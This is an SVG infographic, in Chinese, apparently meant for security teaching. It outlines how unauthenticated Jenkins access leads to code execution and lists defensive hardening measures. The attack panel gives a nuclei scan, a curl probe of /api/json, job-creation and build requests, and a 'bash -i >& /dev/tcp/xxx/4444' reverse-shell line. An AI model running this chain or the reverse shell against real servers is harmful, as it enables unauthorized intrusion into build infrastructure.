<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 500" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="500" fill="#f8fafc"/>
  <defs>
    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#c53030"/>
    </marker>
  </defs>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">Jenkins 未授权访问到代码执行</text>

  <rect x="40" y="70" width="150" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="115" y="102" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">① 发现 Jenkins</text>

  <line x1="190" y1="95" x2="225" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="230" y="70" width="150" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="305" y="102" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">② 确认未授权</text>

  <line x1="380" y1="95" x2="415" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="420" y="70" width="150" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="495" y="102" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">③ 创建 Job</text>

  <line x1="570" y1="95" x2="605" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="610" y="70" width="150" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="685" y="102" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">④ 执行脚本</text>

  <line x1="760" y1="95" x2="795" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="800" y="70" width="170" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="885" y="102" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">⑤ 反弹 Shell</text>

  <rect x="40" y="150" width="460" height="320" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">Jenkins 利用步骤</text>

  <text x="70" y="205" font-size="10" font-weight="bold" fill="#c53030">① 发现 Jenkins：</text>
  <text x="70" y="225" font-size="9" fill="#2d3748">http://target:8080/login</text>
  <text x="70" y="245" font-size="9" fill="#2d3748">nuclei -t http/default-credentials/</text>

  <text x="70" y="270" font-size="10" font-weight="bold" fill="#805ad5">② 确认未授权：</text>
  <text x="70" y="290" font-size="9" fill="#2d3748">curl -s http://target:8080/api/json</text>
  <text x="70" y="310" font-size="9" fill="#2d3748">返回 JSON → 未授权</text>

  <text x="70" y="335" font-size="10" font-weight="bold" fill="#dd6b20">③ 创建 Job：</text>
  <text x="70" y="355" font-size="9" fill="#2d3748">POST /createItem?name=exploit</text>
  <text x="70" y="375" font-size="9" fill="#2d3748">Content-Type: text/xml</text>
  <text x="70" y="395" font-size="9" fill="#2d3748">body: &lt;com.cloudbees....&gt;</text>

  <text x="70" y="420" font-size="10" font-weight="bold" fill="#3182ce">④ 执行脚本：</text>
  <text x="70" y="440" font-size="9" fill="#2d3748">POST /job/exploit/build</text>
  <text x="70" y="460" font-size="9" fill="#2d3748">shell: bash -i &gt;&amp; /dev/tcp/xxx/4444</text>

  <rect x="520" y="150" width="440" height="320" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">防御加固</text>

  <text x="550" y="205" font-size="10" font-weight="bold" fill="#c53030">访问控制：</text>
  <text x="550" y="225" font-size="9" fill="#2d3748">启用 Jenkins 认证（推荐 OAuth/LDAP）</text>
  <text x="550" y="245" font-size="9" fill="#2d3748">管理员密码强密码 + 定期更换</text>

  <text x="550" y="275" font-size="10" font-weight="bold" fill="#805ad5">网络隔离：</text>
  <text x="550" y="295" font-size="9" fill="#2d3748">Jenkins 不暴露在公网</text>
  <text x="550" y="315" font-size="9" fill="#2d3748">VPN / 堡垒机访问</text>

  <text x="550" y="345" font-size="10" font-weight="bold" fill="#dd6b20">CSRF 防护：</text>
  <text x="550" y="365" font-size="9" fill="#2d3748">启用 CSRF Protection Plugin</text>
  <text x="550" y="385" font-size="9" fill="#2d3748">升级 Jenkins 到最新版本</text>

  <text x="550" y="415" font-size="10" font-weight="bold" fill="#3182ce">API 限制：</text>
  <text x="550" y="435" font-size="9" fill="#2d3748">限制 /api/* 访问（WAF）</text>
  <text x="550" y="455" font-size="9" fill="#2d3748">审计 Jenkins API 调用日志</text>
</svg>
